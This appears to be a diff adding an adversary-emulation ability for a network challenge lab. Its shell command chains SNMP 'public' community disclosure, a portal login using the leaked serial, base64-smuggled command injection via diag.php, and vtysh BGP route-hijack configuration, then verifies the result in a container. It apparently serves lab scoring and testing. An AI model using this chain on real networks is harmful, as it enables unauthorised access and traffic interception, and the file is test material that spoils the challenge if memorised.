@@ -1,0 +1,17 @@
+id: 96be240a-0d61-4c29-b6f0-30555b716dd4
+name: Network-CarrierDakshinLinkRouteInterception-Attack
+description: >
+  Exercises the live SNMP disclosure, portal authentication, diagnostic
+  command-injection and selective BGP route-interception chain.
+tactic: impact
+technique_id: T1557
+technique_name: Adversary-in-the-Middle
+sub_technique: None
+tag: blue
+executors:
+  - name: sh
+    platform: linux
+    command: >-
+      BASE=/opt/network-challenges/carrier-dakshinlink-route-interception; test -r "$BASE/runtime/scoring.env" || { echo "Runtime state missing"; exit 10; }; . "$BASE/runtime/scoring.env"; COOKIE="$(mktemp)"; trap 'rm -f "$COOKIE"' EXIT; SERIAL="$(snmpwalk -v1 -c public -t 2 -r 1 "udp:${PUBLIC_IP}:${PUBLIC_SNMP_PORT}" .1.3.6.1.2.1.47.1.1.1.1.11 2>/dev/null | sed -n 's/.*SN#\([^" ]*\).*/\1/p' | head -n1)"; test -n "$SERIAL"; curl -fsS -L --max-time 10 -c "$COOKIE" -b "$COOKIE" --data-urlencode "username=admin" --data-urlencode "password=$SERIAL" "http://${PUBLIC_IP}:${PUBLIC_HTTP_PORT}/index.php" >/dev/null; REMOTE="$(printf "%s" ";vtysh -c 'configure terminal' -c 'ip prefix-list HIJACK seq 5 permit ${HIJACK_PREFIX_A}' -c 'ip prefix-list HIJACK seq 10 permit ${HIJACK_PREFIX_B}' -c 'route-map TO-AS2 permit 10' -c 'match ip address prefix-list HIJACK' -c 'set community no-export' -c 'route-map TO-AS2 permit 20' -c 'route-map TO-AS3 deny 10' -c 'match ip address prefix-list HIJACK' -c 'route-map TO-AS3 permit 20' -c 'router bgp ${AS1}' -c 'network ${HIJACK_PREFIX_A}' -c 'network ${HIJACK_PREFIX_B}' -c 'end' -c 'clear bgp ${R2_R1R2_IP} soft out'")"; CHECK="$(printf "%s" "$REMOTE" | base64 -w 0)"; curl -fsS --max-time 25 -b "$COOKIE" --data-urlencode "check=$CHECK" "http://${PUBLIC_IP}:${PUBLIC_HTTP_PORT}/diag.php" >/dev/null; sleep 8; docker exec "$R2_CONTAINER" ip -4 route get "$FTP_SERVER_IP" | grep -Fq "via $R1_R1R2_IP" && echo "Attack Simulation Completed"
+    payloads: []
+    parsers: []
